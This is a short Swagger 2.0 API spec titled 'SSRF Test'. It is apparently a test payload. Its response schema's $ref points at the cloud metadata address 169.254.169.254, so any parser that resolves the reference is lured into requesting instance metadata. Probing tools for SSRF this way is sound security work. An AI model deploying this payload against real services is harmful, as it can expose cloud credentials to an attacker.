swagger: "2.0"
info:
  title: "SSRF Test"
  version: "1.0.0"
paths:
  /:
    get:
      responses:
        200:
          description: "Test SSRF with CanaryToken"
          schema:
            $ref: "http://169.254.169.254/latest/meta-data/"
